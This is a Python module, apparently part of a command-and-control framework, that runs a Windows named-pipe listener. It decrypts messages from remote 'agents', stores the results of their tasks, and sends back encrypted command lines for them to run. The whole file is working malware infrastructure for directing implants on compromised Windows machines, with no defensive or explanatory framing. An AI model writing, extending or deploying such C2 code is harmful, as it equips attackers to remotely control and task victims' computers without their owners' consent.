"""Windows named-pipe C2 listener.

Runs only on win32. Accepts framed messages:
    <path>\n<agent_id>\n<enc_payload>

Decrypts the payload with the agent session key, then writes back the encrypted
reply prefixed with a 4-byte length.
"""
from __future__ import annotations

import struct
import sys
import threading

if sys.platform == "win32":
    import win32pipe
    import win32file

from .crypto import decrypt, encrypt
from .state import State


def _handle_client(pipe, state: State):
    try:
        size_data = win32file.ReadFile(pipe, 4)
        size = struct.unpack("<I", size_data[1])[0]
        msg = win32file.ReadFile(pipe, size)[1].decode("utf-8")
        parts = msg.split("\n", 2)
        if len(parts) != 3:
            return
        _path, agent_id, enc_payload = parts
        agent = state.get_agent(agent_id)
        if not agent:
            return
        agent.touch()
        try:
            payload = decrypt(enc_payload, agent.session_key)
        except Exception:
            return
        if payload.startswith("RESULT:"):
            _, task_id, result = payload.split(":", 2)
            state.submit_result(task_id, result)
        task = state.pop_next_task(agent_id)
        if task is None:
            reply = encrypt("NOP", agent.session_key)
        else:
            cmd_line = " ".join([task.cmd, *task.args])
            reply = encrypt(f"TASK:{task.task_id}:{cmd_line}", agent.session_key)
        out = reply.encode("utf-8")
        win32file.WriteFile(pipe, struct.pack("<I", len(out)) + out)
    except Exception:
        pass
    finally:
        win32file.CloseHandle(pipe)


def _listener(pipe_name: str, state: State):
    while True:
        pipe = win32pipe.CreateNamedPipe(
            r"\\.\\pipe\\" + pipe_name,
            win32pipe.PIPE_ACCESS_DUPLEX,
            win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_WAIT,
            255,
            65536,
            65536,
            0,
            None,
        )
        win32pipe.ConnectNamedPipe(pipe, None)
        t = threading.Thread(target=_handle_client, args=(pipe, state), daemon=True)
        t.start()


def start_pipe_server(pipe_name: str, state: State):
    if sys.platform != "win32":
        return
    t = threading.Thread(target=_listener, args=(pipe_name, state), daemon=True)
    t.start()
